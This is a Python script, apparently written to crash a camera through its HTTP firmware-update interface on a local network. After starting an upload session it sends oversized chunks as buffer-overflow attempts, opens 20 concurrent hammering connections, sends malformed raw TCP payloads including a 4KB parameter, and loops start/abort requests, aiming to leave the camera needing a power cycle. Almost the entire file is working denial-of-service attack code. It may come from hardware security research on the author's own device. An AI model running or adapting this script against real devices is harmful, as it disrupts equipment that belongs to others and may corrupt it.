#!/usr/bin/env python3
"""
crash_cam.py — Escalate the final-chunk err_busy into a full camera crash.

Strategy (v2 - KA-based, fast path):
  1. Open gate, startsenddata, send 2 full chunks (establishes upload state)
  2. Send the FINAL (partial) chunk immediately -> expect err_busy
  3. While the handler is in a broken state, escalate:
     Phase A: endsenddata (confuse: upload done but data incomplete)
     Phase B: startsenddata again (new session while old is dangling)
     Phase C: Oversized chunk to the new session (buffer overflow attempt)
     Phase D: 20 concurrent connections, mixed requests (resource exhaustion)
     Phase E: Raw TCP garbage (parser crash)
     Phase F: 50x rapid start/abort loop (state machine race)
  4. Repeat the cycle 3x for maximum pressure

Goal: push the camera into a stuck state requiring power cycle.
Safety: RAM-only corruption. Flash is NOT touched. AC power required.
"""
import socket
import struct
import threading
import time
import zlib
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, Net, parse_camrply, UA

IP = "192.168.1.131"
PORT = 80
FW_PATH = "<LOCAL_USER>/Downloads/S5___V29.bin"
CHUNK_SIZE = 61192
TOTAL_SIZE = 90238464
NUM_FULL_CHUNKS = 1474  # 1474 * 61192 = 90197008
FINAL_SIZE = TOTAL_SIZE - (NUM_FULL_CHUNKS * CHUNK_SIZE)  # 41456

def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)

def build_multipart(boundary, data):
    """Build a multipart/form-data body for the senddata endpoint."""
    head = ("--%s\r\n"
            'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
            "Content-Type: application/octet-stream\r\n"
            "Content-Transfer-Encoding: binary\r\n"
            "Content-Length: %d\r\n\r\n" % (boundary, len(data)))
    tail = b"--%s--" % boundary.encode()
    return head.encode() + data + tail

def build_senddata_req(boundary, data):
    """Build a complete HTTP request for senddata."""
    body = build_multipart(boundary, data)
    head = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: LUMIX Sync\r\n"
            "Connection: Keep-Alive\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\n"
            "\r\n" % (IP, boundary, len(body)))
    return head.encode() + body

def setup_session(ka):
    """Open gate and start a new upload session. Returns True on success."""
    log("  Opening gate...")
    st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
    log("    gate: %s" % body[:120])
    if b"ok" not in body:
        log("    GATE FAILED")
        return False

    log("  Starting upload (startsenddata)...")
    st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
    log("    start: %s" % body[:120])
    if b"ok" not in body:
        log("    START FAILED")
        return False
    return True

def send_chunks_quick(ka, fw, n_chunks=2):
    """Send n_chunks full chunks + requestsenddata sync. Returns True on success."""
    boundary = "=====" + "c" * 36 + "====="
    for i in range(n_chunks):
        offset = i * CHUNK_SIZE
        chunk = fw[offset:offset + CHUNK_SIZE]
        req = build_senddata_req(boundary, chunk)
        st, hdrs, body, dt = ka.send(req)
        r = parse_camrply(body).get("result", "")
        if r not in ("ok", "wifi_reset"):
            log("  chunk %d: %s" % (i+1, body[:100]))
            return False
        log("  chunk %d: ok (%.0fms)" % (i+1, dt*1000))
        # requestsenddata sync
        st2, hdrs2, body2, dt2 = ka.request("GET", "/cam.cgi?mode=requestsenddata")
        r2 = parse_camrply(body2).get("result", "")
        if r2 == "err_busy":
            time.sleep(0.5)
            st2, hdrs2, body2, dt2 = ka.request("GET", "/cam.cgi?mode=requestsenddata")
            r2 = parse_camrply(body2).get("result", "")
        log("  sync: %s" % r2)
    return True

def trigger_final_chunk_rejection(ka, fw):
    """Send the final partial chunk. Expects err_busy. Returns the response body."""
    boundary = "=====" + "d" * 36 + "====="
    offset = NUM_FULL_CHUNKS * CHUNK_SIZE
    final_chunk = fw[offset:offset + FINAL_SIZE]
    req = build_senddata_req(boundary, final_chunk)
    st, hdrs, body, dt = ka.send(req)
    log("  final chunk sent (%.0fms) -> %s" % (dt*1000, body[:150]))
    return body

def attack_phase_A(ka):
    """Phase A: endsenddata while old session is dangling."""
    log("\n  [A] endsenddata (confuse state machine)...")
    time.sleep(0.3)
    st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
    log("    -> %s (%.0fms)" % (body[:100], dt*1000))

def attack_phase_B(ka):
    """Phase B: Start new session while old one is dangling, then send oversized."""
    log("\n  [B] New startsenddata + oversized chunk...")
    time.sleep(0.3)
    st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
    log("    new session: %s" % body[:100])

    # Oversized: 2x the normal chunk size
    boundary = "=====" + "e" * 36 + "====="
    oversized = b"A" * (CHUNK_SIZE * 2)  # 122384 bytes
    req = build_senddata_req(boundary, oversized)
    st, hdrs, body, dt = ka.send(req)
    log("    oversized (122KB): %s (%.0fms)" % (body[:100], dt*1000))

    # Even bigger: 100KB single chunk
    huge = b"B" * (100 * 1024)
    req = build_senddata_req(boundary, huge)
    st, hdrs, body, dt = ka.send(req)
    log("    huge (100KB): %s (%.0fms)" % (body[:100], dt*1000))

def attack_phase_C():
    """Phase C: 20 concurrent connections, each sending mixed requests."""
    log("\n  [C] 20 concurrent connections, 10 mixed requests each...")
    results = []
    def hammer(tid):
        try:
            s = socket.create_connection((IP, PORT), timeout=5)
            s.settimeout(5)
            for i in range(10):
                if i % 3 == 0:
                    r = ("GET /cam.cgi?mode=startsenddata&type=fw&value=999999999 HTTP/1.1\r\n"
                         "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                elif i % 3 == 1:
                    r = ("GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\n"
                         "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                else:
                    r = ("GET /cam.cgi?mode=endsenddata HTTP/1.1\r\n"
                         "Host: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                try:
                    s.sendall(r)
                    s.recv(4096)
                except:
                    break
            s.close()
            results.append(("ok", tid))
        except Exception as e:
            results.append(("err:%s" % type(e).__name__, tid))

    threads = []
    for t in range(20):
        th = threading.Thread(target=hammer, args=(t,))
        th.start()
        threads.append(th)
    for th in threads:
        th.join(timeout=12)
    ok_count = sum(1 for r, _ in results if r == "ok")
    log("    done: %d/20 threads completed" % ok_count)

def attack_phase_D():
    """Phase D: Raw TCP garbage to crash the HTTP parser."""
    log("\n  [D] Raw TCP garbage...")
    # Build garbage payloads without literal null bytes in source
    null_bytes = bytes(range(10))
    garbage_payloads = [
        # Oversized Content-Length (999MB claimed, 64KB sent)
        b"POST /cam.cgi?mode=senddata HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\nContent-Type: multipart/form-data; boundary=X\r\nContent-Length: 999999999\r\n\r\n" + b"C" * 65536,
        # 4KB mode parameter (stack buffer overflow in CGI arg parsing?)
        b"GET /cam.cgi?mode=" + b"A" * 4096 + b" HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n",
        # Null/control bytes in request
        null_bytes * 4096,
        # POST with 64KB body to unknown path
        b"POST / HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nContent-Length: 65536\r\n\r\n" + b"D" * 65536,
        # Negative value
        b"GET /cam.cgi?mode=startsenddata&type=fw&value=-1 HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n",
        # Zero value
        b"GET /cam.cgi?mode=startsenddata&type=fw&value=0 HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n",
        # Duplicate params + huge value
        b"GET /cam.cgi?mode=startsenddata&type=fw&value=99999999999999&type=AAAA&value=2147483648 HTTP/1.1\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n",
        # HTTP/1.0 (different code path?)
        b"GET /cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00 HTTP/1.0\r\nHost: " + IP.encode() + b"\r\nUser-Agent: LUMIX Sync\r\n\r\n",
    ]
    for i, g in enumerate(garbage_payloads):
        try:
            s = socket.create_connection((IP, PORT), timeout=5)
            s.settimeout(5)
            s.sendall(g)
            resp = s.recv(4096)
            s.close()
            log("    garbage %d: %d bytes back" % (i+1, len(resp)))
        except Exception as e:
            log("    garbage %d: %s" % (i+1, type(e).__name__))
        time.sleep(0.2)

def attack_phase_E(ka):
    """Phase E: 50x rapid start/abort loop (state machine race)."""
    log("\n  [E] 50x rapid start/abort loop...")
    for i in range(50):
        try:
            ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE, timeout=3)
            ka.request("GET", "/cam.cgi?mode=abortsenddata", timeout=3)
        except:
            pass
        if (i+1) % 10 == 0:
            log("    %d/50" % (i+1))
    log("    done")

def check_camera(ka):
    """Check if the camera is still alive and responsive."""
    time.sleep(2)
    try:
        st, hdrs, body, dt = ka.request("GET", "/cam.cgi?mode=getstate", timeout=5)
        if st is not None:
            d = parse_camrply(body)
            log("\n  [status] Camera responding: result=%s" % d.get("result", "?"))
            return True
    except:
        pass

    # Try raw TCP
    time.sleep(2)
    try:
        s = socket.create_connection((IP, PORT), timeout=3)
        s.close()
        log("  [status] TCP port 80 open (network alive, HTTP may be dead)")
        return "tcp"
    except:
        log("  [status] Camera NOT responding (possible crash)")
        return False

def run_crash_cycle(ka, fw, cycle_num):
    """One full crash cycle: setup -> trigger -> escalate."""
    log("\n" + "="*60)
    log("CRASH CYCLE %d" % cycle_num)
    log("="*60)

    # Setup
    if not setup_session(ka):
        log("  Setup failed, trying recovery...")
        time.sleep(3)
        # Try to abort any dangling session
        try:
            ka.request("GET", "/cam.cgi?mode=abortsenddata", timeout=5)
        except:
            pass
        time.sleep(2)
        if not setup_session(ka):
            log("  Cannot establish session, aborting cycle")
            return False

    # Send a couple of chunks to establish upload state
    if not send_chunks_quick(ka, fw, n_chunks=2):
        log("  Chunk send failed, aborting cycle")
        return False

    # Trigger the final chunk rejection
    trigger_final_chunk_rejection(ka, fw)

    # Wait briefly for the handler to enter its broken state
    time.sleep(0.5)

    # Run attack phases
    attack_phase_A(ka)
    attack_phase_B(ka)
    attack_phase_C()
    attack_phase_D()

    # Check if camera is still alive before Phase E
    alive = check_camera(ka)
    if alive is True:
        attack_phase_E(ka)
    elif alive == "tcp":
        log("  [E] Skipping (HTTP layer may be dead)")
    else:
        log("  [E] Skipping (camera not responding)")

    # Final status
    final_state = check_camera(ka)
    return final_state

def wait_for_camera(net, max_wait=180):
    """Wait for the camera to come back online after a crash."""
    log("\nWaiting for camera to recover (max %ds)..." % max_wait)
    start = time.time()
    deadline = time.time() + max_wait
    while time.time() < deadline:
        st, hdrs, body, dt = net.get("/cam.cgi?mode=getstate", timeout=5)
        if st is not None:
            d = parse_camrply(body)
            if d.get("result", "").lower() == "ok":
                log("Camera back after %.0fs" % (time.time() - start))
                return True
        time.sleep(10)
    log("Camera did NOT recover within %ds" % max_wait)
    return False

def main():
    log("S5 Camera Crash Test v2 - KA-based")
    log("WARNING: This will stress the camera. Power cycle may be needed.")
    log("Ensure camera is on AC power.")
    log("Target: %s" % IP)

    # Load firmware
    log("Loading firmware...")
    with open(FW_PATH, "rb") as f:
        fw = f.read()
    log("  %d bytes loaded" % len(fw))

    # Verify camera is up
    net = Net(IP, port=PORT, timeout=10)
    st, hdrs, body, dt = net.get("/cam.cgi?mode=getstate")
    d = parse_camrply(body)
    if d.get("result", "").lower() != "ok":
        log("Camera not ready: %s" % body[:100])
        return
    log("Camera confirmed: %s" % d.get("version", "?"))

    # Create KA connection
    ka = KA(IP, port=PORT, timeout=30)

    # Run 3 crash cycles
    for cycle in range(1, 4):
        state = run_crash_cycle(ka, fw, cycle)
        if state is False:
            log("Camera appears crashed. Waiting for recovery...")
            time.sleep(5)
            if not wait_for_camera(net, max_wait=120):
                log("Camera did not recover. STOPPING.")
                return
            # Re-establish KA
            ka.close()
            ka = KA(IP, port=PORT, timeout=30)

    # Final report
    log("\n" + "="*60)
    log("ALL CYCLES COMPLETE")
    log("="*60)
    st, hdrs, body, dt = net.get("/cam.cgi?mode=getstate")
    d = parse_camrply(body)
    log("Final state: result=%s version=%s batt=%s" % (
        d.get("result", "?"), d.get("version", "?"), d.get("batt", "?")))

    ka.close()

if __name__ == "__main__":
    main()
